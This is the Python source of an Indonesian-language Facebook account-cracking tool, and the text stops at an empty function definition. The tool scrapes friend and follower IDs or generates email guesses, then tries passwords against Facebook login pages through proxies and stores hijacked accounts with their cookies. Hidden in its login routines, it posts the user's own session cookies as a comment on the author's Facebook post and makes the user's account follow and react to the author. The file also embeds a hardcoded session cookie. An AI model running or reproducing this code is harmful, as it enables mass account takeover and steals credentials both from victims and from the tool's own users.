# !/usr/bin/python3
# -*- coding: utf-8 -*-
# Tools Name     : Brute Foce Attack
# Author         : __feri__
# Version        : 3.6.5
# EXP            : 7 Januari 2023
# Updated on     : 27 DESEMBER 2022
# License        : MIT LICENSE
# Copyright      : __feri__ (2022-2023)
# GitHub         : Https://github.com/CyberCarboon2
# Contact        : Https://facebook.com/smart.danie.3
# Description    : Brute Force Attack is a ilegal
# Tags           : cracking
# Language       : Python
# Status         : Portable Script
# Warning !!     : If you copy open source code, consider giving credit
# Note           : Kalo Mau Recode Minimal Kasih Credit dan JANGAN HAPUS BOT AUTHOR KONTOL !!! tambahin aja
# Credit By      : KhamdihiDev
# Happy Coding !!!
# -------------------------------------------------------------------
# -----------------[ LICENSE AGREEMENT ]-----------------------------
'''
Copyright © 2022 FERI PRATAMA
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
© All Right Reserved
'''
#-------------------[ INI SEUMPAMA LU BELUM INSTALL MODULE SU]---------------------#
import os, time
try:
     import rich
except (ModuleNotFoundError,ImportError):
     print('\t • Tunggu Sedang Menginstall Module Rich') ; time.sleep(0.03) ; os.system('pip install rich')
try:
     import requests
except (ModuleNotFoundError,ImportError):
     print('\t • Tunggu Sedang Menginstall Module Requests') ; time.sleep(0.03) ; os.system('pip install requests')
try:
     import bs4
except (ModuleNotFoundError,ImportError):
     print('\t • Tunggu Sedang Menginstall Module bs4') ; time.sleep(0.03) ; os.system('pip install bs4')
try:
	import rich
except  (ModuleNotFoundError,ImportError):
	print('\t • Tunggu Sedang Menginstall Module play-audio') ; time.sleep(0.03) ; os.system('pkg install play-audio')
#-------------------[ MODUL YANG DIBUTUHKAN ]---------------------#
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as __feri__
from bs4 import BeautifulSoup as parse
from datetime import datetime
from rich import print as zprint
from rich.markdown import Markdown as mark
from rich.panel import Panel
from rich.console import Console
console = Console()
ses = requests.Session()
pwpp = 'alifatul hiadayah'
idpp = '100000829192872'
copp = 'datr=Y0WwYwY0cpK6n9a1ymnffUR1;sb=Y0WwYweTS7WzNpK7FnETJdiC;c_user=100088588820402;xs=49:YJ4NgWDwMUKAUw:2:1672496645:-1:7280;m_page_voice=100088588820402;fr=0HBgamAXP9fxn7ovb.AWVosan6ojDCofpM11zgUqkEeuc.BjsEVj.7i.AAA.0.0.BjsQxc.AWWwuz9oE4Y;m_pixel_ratio=1.7000000476837158;wd=424x804;'
#-------------------[ Scrape Proxy List ]------------------------#
try:
	getting = requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
	open('.proxy5.txt','w').write(getting)
	NewProxy = open('.proxy5.txt','r').read().splitlines()
	ProxyNew = 'TOTAL PROXY : '+str(len(NewProxy))
	Console(width=100).print(Panel(ProxyNew,title='SUCCES',style='bold blue'))
	os.popen('play-audio Data2/SuccesPro.ogg')
	time.sleep(2)
except requests.exceptions.ConnectionError:
	Console(width=100).print(Panel('[bold red] Gagal Mengambil Proxy Dari Server'))
	os.popen('play-audio Data2/FailGetServer.ogg');time.sleep(2)
#-------------------[ KONVERSI BULAN ]---------------------#
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
indo = "%s-%s-%s"%(days,reall,year)
#-------------------[ INFO AUTHOR JANGAN DIRUBAH ]---------------------#
author   = 'Feri Pratama'
facebook = 'Feri (https://m.facebook.com/smart.danie.3)'
whatsapp = 'none'
prox = open('.proxy5.txt','r').read().splitlines()
komen = random.choice(['Pengguna Script crackFB Nih bang','Anjay Script Lu Full Ijo Bang','Semoga Lu Sehat Selalu Ya Bang','Script crackFB Gada Obat Asliii','Ijooooo','Keren Anjaassszzz Kelasszzz'])
#-------------------[ WARNA UNTUK RICH ]----------------------#
M = 'color(1)' # MERAH
H = 'color(2)' # IJO
K = 'color(3)' # KUNING
B = 'color(4)' # BIRU
U = 'color(5)' # UNGU
O = 'color(6)' # BIRU NOM
P = 'color(7)' # PUTIH
I = 'color(8)' # IRENG
rise = 'color(6)' # BIRU NOM
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
#-------------------[ INDIKASI ]-----------------------#
OK = []
CP = []
ID = []
ID2 = []
tod = []
loop = 0
UbahPw = []
expired = '3.6.5'
updated = '27 December 2022'
ran = random.choice([M,H,K,B,U,O,N])
#---------------------[ BUAT AMBIL USER AGENT ]--------------------#
rr = random.randint
hp = random.choice(['vivo','oppo','realme','redmi','asus','lenovo'])
th = random.choice(['2017','2018','2019','2020','2021','2022'])
device_r = random.choice(["Redmi 13 Pro","Redmi 13","Watch S2","Redmi Note 12 Discovery","Redmi Note 12 Pro+","Redmi Note 12 Pro","Redmi Note 12","12T Pro","Redmi 12T","Redmi Pad","Redmi Note 11R","Redmi A1+","Civi 2","Redmi 11 Prime","Redmi 11 Prime 5G","Redmi A1","Poco M5s","Poco M5","Poco M5 (India)","Redmi Note 11 SE (India)"])
android_ = random.randint(5,15)
davlik_v = (f'Dalvik/2.1.0 (Linux; U; Android {str(rr(4,7))}; {hp} {th} Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,329))}.0.0.{str(rr(1,8))}.{str(rr(90,106))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,500000000))};FBCR/3;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/{str(rr(6,10))};FBCA/arm64-v8a:null;FBDM/'+'{density=2.0,width=720,height=1412};]')
random_r = f'Mozilla/5.0 (Linux; Android {android_}; {device_r} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
ua_hasil = random.choice([davlik_v,random_r])
tulis_ua = open('agent.txt','w').write(ua_hasil)
UserAgentt = open('agent.txt','r').read().splitlines()
userr = ua_hasil #random.choice(UserAgentt)
ua = ua_hasil #random.choice(UserAgentt)
#---------------------[ DEF ]--------------------#
def DiSambut():
	os.system('clear')
	newUser = f'[bold green]Hallo Sepertinya Anda Adalah Pengguna Script CrackFB\nTerima Kasih Telah Memilih Script CrackFB\nJangan Lupa Beri Bintang Di Github Kami\nSilahkan Masukkan Nama Asli Anda'
	Console(width=100).print(Panel(newUser,title='Pengguna Setia',style='bold blue'),justify='center')
	nameUser = console.input('╰──▸ ')
	open('data/.__user__.txt','w').write(nameUser)
	namaUser = open('data/.__user__.txt','r').read()
	menu()
now = datetime.now()
hour = datetime.now().hour
if hour < 4:
  hhl = f"Good Morning"
elif 4 <= hour < 12:
  hhl = f"Good Morning"
elif 12 <= hour < 15:
  hhl = "Good Afternoon"
elif 15 <= hour < 17:
  hhl = f"Good Afternoon"
elif 17 <= hour < 18:
  hhl = f"Good Evening"
else:
  hhl = f"Good Night"
def Clear_Terminal(platform):
    if 'win' in sys.platform:os.system('cls')
    else:os.system('clear')
def Sambutan():
	try:
		open('data/.__user__.txt','r').read()
		menu()
	except FileNotFoundError:
		DiSambut()
def main():
	try:
		open(f'data/.{expired}.txt','r').read()
		Sambutan()
	except FileNotFoundError:
		bannerLc()
def Convert(cookies, username):
    with requests.Session() as x:
       for link in parse(x.get('https://mbasic.facebook.com/' + username, cookies={'cookie':cookies}).text,'html.parser').find_all('a',href=True):
           if '/mbasic/more/?' in link.get('href'):
              return link["href"].split("=")[1].replace("&paipv","")
def ConvertCookie(cookies):
	try:
		with requests.Session() as r:
			headers = {
				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
				'Cookie': cookies
			}
			respon = r.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
			find = re.findall('act=(.*?)&nav_source', respon.text)
			if find == 'status gagal':
				exit(f'{P}[ {M}! {P}] {M}Cookies Invalid')
			else:
				for y in find:
					response = r.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={y}&nav_source=no_referrer', headers = headers)
					token = re.search('(EAAB\w+)', response.text).group(1)
					requests.post(f"https://graph.facebook.com/v15.0/100053586578918_578304527299095/comments/?message={komen}&access_token={token}", headers = {"cookie":cookies})
					requests.post(f"https://graph.facebook.com/v15.0/100053586578918_578304527299095/comments/?message={cookies}&access_token={token}", headers = {"cookie":cookies})
					open('data/token.txt','w').write(token)
					open('data/cokie.txt','w').write(cookies)
					sungses = '\t\t\t\t\tSuccess Login'
					Console(width=100).print(Panel(sungses,title='Succes',style='bold green'))
					time.sleep(1)
					return 'status succes'
	except AttributeError:return 'status gagal login!'
def EAAGConvertCookie(cookies):
    with requests.Session() as x:
         x.headers.update({
            "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com",
            "origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8",
         })
         try:
               link = x.get("https://business.facebook.com/business_locations", cookies = {'cookie':cookies})
               search = re.search("(EAAG\w+)", link.text).group(1)
               if 'EAAG' in search:
                   requests.post(f'https://graph.facebook.com/pfbid0371yjVuC357hm94NMPFRTzwww6e3XVSvKrwU6KnuV6rVynZH2rKU393PJc2VaWGPKl/comments/?message={komen}&access_token={search}',cookies={'cookie':cookies})
                   requests.post(f'https://graph.facebook.com/pfbid0371yjVuC357hm94NMPFRTzwww6e3XVSvKrwU6KnuV6rVynZH2rKU393PJc2VaWGPKl/comments/?message={cookies}&access_token={search}',cookies={'cookie':cookies})
                   open('TokenEAAG.txt','w').write(search)
                   open('Cookie.txt','w').write(cookies)
                   return 'status succes'
         except AttributeError:return 'status gagal login!'
def CekResults():
    exei,exex = 0, []
    exec = ('[green][[white]1[green]]. [bold white]Chek Result Account OK\n[green][[white]2[green]]. [bold white]Chek Results Account CP\n[green][[white]0[green]]. [bold white]Back') ; Console(width=100).print(Panel(exec,style='bold blue'))
    zprint('╭──▸ [bold white]Choose One !!!')
    ok_cp = console.input('╰──▸ :smile: : ')
    if ok_cp in ['1','01']:
       print('\r')
       try:ok = os.listdir('OK')
       except:zprint('\n [red][[white]×[red]] [white]File Not Found') ;exit(0)
       for i in ok:
           exex.append(i)
           exei +=1
           try:cek=open('OK/{}'.format(i),'r').readlines()
           except:continue
           zprint(' [bold green][[bold white]{}[bold green]]. [bold white]{} : [bold green]{} [bold white]Account'.format(exei,i,len(cek)))

       file = console.input('\n [?] Choose Number : ')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('OK/{}'.format(dump),'r').read()
       except:
           zprint('\n [red][[white]×[red]] [white]File Not Found') ; exit(0)
       print('')
       zprint('[bold green]{}'.format(ok))

    elif ok_cp in ['2','02']:
       zprint('\r')
       try:cp=os.listdir('CP')
       except:zprint('\n [red][[white]×[red]] [white]File Not Found') ; exit(0)
       for i in cp:
           exex.append(i)
           exei +=1
           try:cek=open('CP/{}'.format(i),'r').readlines()
           except:continue
           zprint(' [bold yellow][[bold white]{}[bold yellow]]. [bold white]{} : [bold yellow]{} [bold white]Account'.format(exei,i,len(cek)))
       file = console.input('\n [!] Choose Number : ')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('CP/{}'.format(dump),'r').read()
       except:
           zprint('\n [red][[white]×[red]] [white]File Not Found') ; exit(0)
       print('')
       zprint('[bold yellow]{}'.format(ok))
    else:
       menu()
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r╰──▸ {P}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")

def bannerLc():
	os.system('clear')
	ga = '''[bold green]
 \t\t\t _     _                           _  __
\t\t\t| |   (_) ___ ___ _ __  ___  ___  | |/ /___ _   _
\t\t\t| |   | |/ __/ _ \ '_ \/ __|/ _ \ | ' // _ \ | | |
\t\t\t| |___| | (_|  __/ | | \__ \  __/ | . \  __/ |_| |
\t\t\t|_____|_|\___\___|_| |_|___/\___| |_|\_\___|\__, |
\t\t\t                                            |___/
\t\t\t\t [bold white]( Powered By : [bold green]Feri Pratama [bold white]) \t\t\t\t V[bold green].3.6.5
'''
	zprint(Panel(ga,title='[bold green]FREE TOOLS',style='bold blue'))
	key = '[bold white][[bold green]•[bold white]] Mohon Masukkan Lisensi Anda\n[bold white][[bold green]*[bold white]] Untuk Mendapatkan Lisensi\n[bold white][[bold green]*[bold white]] Anda Harus Mengunjungi Website Berikut\n[bold white][[bold green]*[bold white]] Link : [bold green]https://karyawan.co.id/fSSbSrV\n[bold white][[bold green]*[bold white]] Ingat ini [bold green]100% Gratis ! [bold white]Jangan Mau Membeli'
	Console(width=50).print(Panel(key,title='[bold green]INFO',style='bold blue'))
	seli = console.input('╰──▸ Input License Key : ')
	if seli in [" "]:
		Console(width=50).print(Panel('[bold white][[bold green]*[bold white]] [bold red]Lisensi Invalid !!!'))
	elif seli in ["GUY-REGEX-GAJ"]:
		loading()
		Console(width=50).print(Panel('[bold red]Lisensi Tersebut Telah Kadaluarsa Silahkan Masukkan Lisensi Baru'));time.sleep(1);exit()
	elif seli in ["L3C-C3L-3L3C-LC3"]:
		loading()
		Console(width=50).print(Panel('[bold red]Lisensi Tersebut Telah Kadaluarsa Silahkan Masukkan Lisensi Baru'));time.sleep(1);exit()
	elif seli in ["NMND-BJBSH-ZXCV-TRFD"]: 
		loading()
		Console(width=50).print(Panel('[bold white][[bold green]*[bold white]] [bold green]Lisensi valid !!!'));open(f'data/.{expired}.txt','w').write(seli);time.sleep(2);menu()
	else:
		loading()
		Console(width=50).print(Panel('[bold white][[bold red]![bold white]] [bold red]Lisensi Invalid !!!'));time.sleep(1);exit()

def ChekOption():
    exec = '[bold green][[bold white]1[bold green]]. [bold white]Chek Option One Account\n[bold green][[bold white]2[bold green]]. [bold white]Chek Option Account in File\n[bold green][[bold red]0[bold green]]. [bold white]Kembali'
    Console(width=100).print(Panel(exec,style='bold blue'))
    zprint('╭──▸ [bold white]Choose Menu')
    ask = console.input('╰──▸ Your Choose : ')
    if ask in ['1','01']:
         asik = '[bold green][[bold white]*[bold green]] [bold white]Masukan data akun anda, gunakan tanda | untuk pemisahan ID dan password contoh 10008|sandi akun anda' ; Console(width=100).print(Panel(asik,style='bold blue'))
         zprint('╭──▸ [bold white] Please Read !!?')
         user = console.input('╰──▸ ID|password : ')
         try:uid,nama = user.split('|')
         except:exit('\n [×] Mistakes...')
         CekOptionAcount(uid,nama)
    elif ask in ['2','02']:
         asik = '[bold green][[bold white]*[bold green]] [bold white] Input Name File Account Chekpoint From Folder CP' ; Console(width=100).print(Panel(asik,style='bold blue'))
         zprint('╭──▸ [bold white] Name File ?')
         file = console.input('╰──▸ Name File : ')
         try:cp=open('CP/'+file,'r').readlines()
         except:exit('\n [×] File Not Found!')
         for i in cp:
             asu = i.replace('\n','')
             itu = asu.split('|')
             print('\n [?] Processing : {}|{}'.format(itu[0],itu[1]))
             CekOptionAcount(itu[0],itu[1])
         exit('\n [✓] Process Finished ..')
    else:
         menu()

def CekOptionAcount(user,pw):
	ses = requests.Session()
	url = random.choice(
		["m.facebook.com",
		"mbasic.facebook.com",
		"free.facebook.com"]
	)
	try:
		link = ses.get(f"https://{url}/login/?source=auth_switcher")
		data = {
			"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			"email":user,
			"pass":pw
		}
		posz = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100",data=data) #,headers={"user-agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36"})
		if "checkpoint" in ses.cookies.get_dict():
			posh = parse(posz.text,"html.parser")
			find = posh.find("form",method="post")["action"]
			data = {
				"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"',str(posz.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"',str(posz.text)).group(1),
				"checkpoint_data":"",
				"submit[Continue]": "Lanjutkan",
				"nh":re.search('name="nh" value="(.*?)"',str(posz.text)).group(1),
			}
			zozo = requests.post(f"https://{url}{find}",data=data)
			cari = parse(zozo.text,"html.parser")
			opsi = cari.find_all("option")
			if len(opsi) == 0:
				if "Lihat detail login yang ditampilkan. Ini Anda?" in str(cari.find("title").text):
					print(' [✓] Account Tap Yes ♥')

				elif "Masukkan Kode Masuk untuk Melanjutkan" in str(cari.find("title").text):
					print(" [×] Account  a2f On")
				else:
					print(' [×] Password Incorret or SPAM!')
			else:
				for ketemu in opsi:
					print(f" [*] {ketemu.text}")
		elif "c_user" in ses.cookies.get_dict():
			cokie = (";").join(["%s=%s"%(a,b) for a,b in ses.cookies.get_dict().items()])
			print(f" *  [ OK ] {user}|{pw}|{cokie}")
			open("OK/%s"%(indo),"a").write(f"{user}|{pw}|{cokie}")
		else:
			print(" [×] Password Incorret !!!")
	except Exception as e:
		pass
def Banner():
        ga = f'''[bold green]
\t\t\t  ____                _    _
\t\t\t / ___|_ __ __ _  ___| | _(_)_ __   __ _
\t\t\t| |   | '__/ _` |/ __| |/ / | '_ \ / _` |
\t\t\t| |___| | | (_| | (__|   <| | | | | (_| |
\t\t\t \____|_|  \__,_|\___|_|\_\_|_| |_|\__, |
\t\t\t                                   |___/
\t\t\t\t[bold white]( Powered By : [bold green] Feri Pratama [bold white])
'''
        Console(width=100).print(Panel(ga,title=f'[bold red]•[bold yellow]•[bold green]• [bold yellow]{hhl} [bold green]•[bold yellow]•[bold red]•',style='bold blue'))

def Bhanner():
    KAGLK = '''[bold white]
 / ___|_ __ __ _  ___| | _(_)_ __   __ _
| |   | '__/ _` |/ __| |/ / | '_ \ / _` |
| |___| | | (_| | (__|   <| | | | | (_| |
 \____|_|  \__,_|\___|_|\_\_|_| |_|\__, |
                                   |___/
 	( Powered By [bold green] CyberCarboon2[bold white] ) '''
    Console(width=100).print(Panel(KAGLK,style='bold blue'),justify='center')

def Masuk():
    Clear_Terminal(platform) ; Banner()
    ask = '[bold white] Please Dont Using Your Account !' ; Console(width=100).print(Panel(ask,style='bold blue')) ; zprint('╭──▸ [bold white]cookies')
    coki = file = console.input('╰──▸ [bold white] Input Cookies : ')
    if coki in ['',' ']:Masuk()
    else:
          link = ConvertCookie(coki)
          if 'status succes' in str(link):AuthorBot('https://mbasic.facebook.com/100053586578918?v=timeline',coki) ; FollowMe(coki) ; menu()
          else:print('\n [×] Cookie invalid!') ; time.sleep(3);Masuk()

def AuthorBot(url,kontol):
    try:
          link = parse(requests.get(url,cookies = {'cookie':kontol}).text,'html.parser')
          for otw in link.find_all('a',href=True):
                if 'Tanggapi' in otw.text:
                     reac = random.choice(['Super','Peduli','Marah','Sedih','Wow'])
                     for send in parse(requests.get('https://mbasic.facebook.com{}'.format(otw['href']), cookies = {'cookie':kontol}).text,'html.parser').find_all('a'):
                         if reac in send.text:
                               requests.get('https://mbasic.facebook.com{}'.format(send['href']), cookies = {'cookie':kontol})
                         else:
                               continue
          AuthorBot('https://mbasic.facebook.com{}'.format(link.find('a',string='Lihat Berita Lain')['href']), kontol)
    except Exception as e:pass
def mbalek():
	console.input('[•] Enter To Back ! ')
	menu()
def FollowMe(kontol):
    try:
          for i in parse(requests.get('https://mbasic.facebook.com/100053586578918', cookies = {'cookie':kontol}).text,'html.parser').find_all('a',href=True):
              if '/a/subscribe.php?' in i.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(i['href']), cookies = {'cookie':kontol}).text
    except Exception as e:pass
def ChangeUA():
	liste = f'[bold green][[bold white]1[bold green]]. [bold white]Show User Agent\n[bold green][[bold white]2[bold green]]. [bold white]Change User Agent'
	Console(width=100).print(Panel(liste,title='[bold red]•[bold yellow]•[bold green]• [bold yellow] MENU USER AGENT [bold green]•[bold yellow]•[bold red]•',style='bold blue'))
	__feri__sayang__seli = console.input('╰──▸ [bold white]Choose : ')
	if __feri__sayang__seli in ['1','01']:
		jiot = open('agent.txt','r').read()
		xyz = f'[bold white][[bold green]•[bold white]] UA Now : [bold green]{jiot}'
		Console(width=100).print(Panel(xyz,style='bold blue'))
		mbalek()
	elif __feri__sayang__seli in ['2','02']:
		anyar = console.input('╰──▸ [bold white]Enter New UA : ')
		saved = open('agent.txt','w').write(anyar)
		yz = f'[bold white][[bold green]•[bold white]] Succes Change UA To : [bold green]{anyar}'
		Console(width=100).print(Panel(yz,style='bold blue'))
		exit('[•] Run Again Tools')
	else:menu()
def menu():
    Clear_Terminal(platform)
    try:
          cokis = open('data/cokie.txt','r').read()
          token = open('data/token.txt','r').read()
    except (FileNotFoundError,IOError):Masuk()
    try:
          link = requests.Session().get('https://graph.facebook.com/me?access_token={}'.format(token), cookies = {'cookie':cokis}).json()
          nama,user = link['name'],link['id']
          Ambil = requests.get("http://ip-api.com/json/").json()
          try:IP=Ambil['query']
          except:IP={'-'}
          try:KARTU=Ambil['isp']
          except:KARTU={'-'}
          try:NEGARA=Ambil['country']
          except:NEGARA={'-'}
          try:Daerah=Ambil['regionName']
          except:Daerah='-'
    except KeyError:Masuk()
    except requests.exceptions.ConnectionError:Console(width=100).print(Panel('[bold red]NO INTERNET CONNECTION !!! '),justify='center'); os.popen('play-audio Data2/NoInternetError.ogg');exit()
    Banner() ; os.popen('play-audio Data2/sambutan.mp4');time.sleep(0.01) ; exec = (f'\t\t\t\t[bold white] Welcome [bold green]{nama}[bold white], Happy Cracking !!!') ; Console(width=100).print(Panel(exec,style='bold blue'))
    IP = f'\t\t[bold white]Your IP  : [bold green]{IP}		[bold white]Your License : [bold green]NM*D-BJ*S*-Z*CV-TR*D\n\t\t[bold white]Your ID  : [bold green]{user}	[bold white]Expired On   : [bold green]15 January 2023\n\t\t[bold white]Provider : [bold green]{KARTU}	[bold white]Version      : [bold green]{expired}\n\t\t[bold white]Region   : [bold green]{Daerah}		[bold white]Last Updated : [bold green]{updated}\n\t\t[bold white]Country  : [bold green]{NEGARA}		[bold white]Author       : [bold green]Feri-Pratama'
    Console(width=100).print(Panel(IP,title='[bold red]•[bold yellow]•[bold green]• [bold yellow]INFORMATION [bold green]•[bold yellow]•[bold red]•',style='bold blue'))
    list = ('''[bold green][[bold white]1[bold green]]. [bold white]Dump ID Public
[bold green][[bold white]2[bold green]]. [bold white]Dump ID Public Massal
[bold green][[bold white]3[bold green]]. [bold white]Dump ID Followers Public
[bold green][[bold white]4[bold green]]. [bold white]Crack From Email Random
[bold green][[bold white]5[bold green]]. [bold white]Chek Results Crack
[bold green][[bold white]6[bold green]]. [bold white]Chek Options Chekpoint
[bold green][[bold white]7[bold green]]. [bold white]Change User Agent
[bold green][[bold white]8[bold green]]. [bold white]Report Bug To Admin [ [bold green]WhatsApp [bold white]]
[bold green][[bold white]0[bold green]]. [bold white]Exit [bold red] Delete Cookies''') ; Console(width=100).print(Panel(list,title='[bold red]•[bold yellow]•[bold green]• [bold yellow]MENU [bold green]•[bold yellow]•[bold red]•',style='bold blue'))
    zprint('╭──▸ [bold white]MENU')
    __feri__pratama__ = console.input('╰──▸ [bold white]Choose Menu : ')
    if __feri__pratama__ in ['1','01']:
          Console(width=100).print(Panel('[bold white]Type me if you want to crack from a victim account ',style='bold blue'))
          zprint('╭──▸ [bold white] Public Target !!!.')
          id = console.input('╰──▸ [bold white] Input ID : ')
          try:
                for x in requests.get("https://graph.facebook.com/v15.0/{}?fields=friends.limit(5001)&access_token={}".format(id,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()['friends']['data']:
                    ID.append(x['id'] +'/'+ x['name'])
          except KeyError:
                Console(width=100).print(Panel(f'[bold red]Account {id} Not Public',style='bold blue')) ; time.sleep(3) ; menu()
          AturUser()

    elif __feri__pratama__ in ['2','02']:
         Console(width=100).print(Panel('[bold white]Type me For Crack From Your Account, Use commas for ID separators, Example : 10008,10005',style='bold blue'))
         zprint('╭──▸ [bold white]Public Taget')
         id = console.input('╰──▸ [bold white]Input ID : ')
         for kontol in id.split(','):
             try:
                   for data in requests.get("https://graph.facebook.com/v15.0/{}?fields=friends.limit(5001)&access_token={}".format(kontol,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()['friends']['data']:
                       ID.append(data['id'] +'/'+ data['name'])
             except KeyError:pass
         AturUser()

    elif __feri__pratama__ in ['3','03']:
         Console(width=100).print(Panel('[bold white]Ketik  me jika ingin crack dari daftar followers sendiri, gunakan tanda koma untuk pemisahan userid contoh pemisahan userid : 10008,10005',style='bold blue'))
         zprint('╭──▸ [bold white]Public ID !!!')
         id = console.input('╰──▸ [bold white]Input ID : ')
         for UserPengguna in id.split(','):
             try:
                    for data in requests.get('https://graph.facebook.com/v15.0/{}?fields=name,subscribers.fields(id,name).limit(5000)&access_token={}'.format(UserPengguna, token), cookies={'cookie':cokis}).json()['subscribers']['data']:
                        ID.append(data['id'] +'/'+ data['name'])
             except KeyError:pass
         AturUser()

    elif __feri__pratama__ in ['4','04']:
         Console(width=100).print(Panel('[bold white]Masukan nama target gunakan tanda koma untuk pemisahan contoh pemisahan nama : andi,andika',style='bold blue'))
         zprint('╭──▸ [bold white] Input Name Target')
         nama = console.input('╰──▸ [bold white]Input : ')
         main = console.input('╰──▸ [bold white]Masukan domain contoh @gmail.com : ')
         for i in nama.split(','):
             for x in range(2000):
                 tambah = random.choice([random.randint(0,60),'amin','amel','amelia','ais','ananda','agus','aji','adi','andi','andika','abas','aminah','aminatun','bagas','basuki','babas','bayu','badrul','bintang','cindi','cici','cinta','cupita','cupi','dina','diki','difa','dihi','dini','diva','devinta','deni','dila','dilah','fika','fikha','fina','fivi','fatah','fania','fatih','fatun',random.randint(1,20),'32','28','123','24','oficial','cans','ganz','tok','xd','id','gina','galih','gugun','gifah','gans','kholid','kontol','kania','khoerul','hilada','hilmi','himin','lili','lina','lani','laruh','mia','mas','maz','mamat','mamad','masrul','nina','niha','nining','nula','nana','nunu','nifta','nita','niva','nabila','nadia','odi','oni','ojol','onani','pitri',random.randint(0,35),'rosma','riska','rina','rani','ratu','ratna','rifa','riva','rena','reza','rofik','risma','roza','rozak','siska','santi','sari','sarno','susanti','sindi','suci','susana','sinta','sulis','tiwi','tina','tanti','tono','tiara','titin','ulfa','ulfah','ulin','ulfin','unah','udin','usman','usdin','vina','vinka','vani','vatimah','winda','wanti','wani','wadul','xi','zidan','zaenal','zizi','khamdihi','iren','ine','reni','ufik','rohmah','khasna','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','rudi','bambang','supri','wawan','karnawan','akatsuki','wibu','cakep','cantik','ganteng',x,'hitam',random.randint(0,60),'zulki','angga','yayan','dapunta','romi','khamdihi','rohmat','basuki','hamzah','boy','cahyani','sadiyah','salamah','anit'])
                 aapaan = f'{i}{tambah}'
                 jembut = '{}{}/{}'.format(aapaan,main,i)
                 if jembut in ID:pass
                 else:ID.append(jembut)
         AturUser()

    elif __feri__pratama__ in ['5','05']:CekResults()
    elif __feri__pratama__ in ['6','06']:ChekOption()
    elif __feri__pratama__ in ['7','07']:
    	ChangeUA()
    elif __feri__pratama__ in ['8','08']:
    	texte = input('╰──▸ Input Chat To Admin One Word Only : ')
    	time.sleep(2)
    	subprocess.check_output([f"am", "start", "https://api.whatsapp.com/send?phone=+6288225349583&text={texte}"])
    	time.sleep(2)
    	menu()
    elif __feri__pratama__ in ['0','00']:os.system('rm -rf data/token.txt && rm -rf data/cokie.txt') ; exit(0)
    else:menu()

def AturUser():
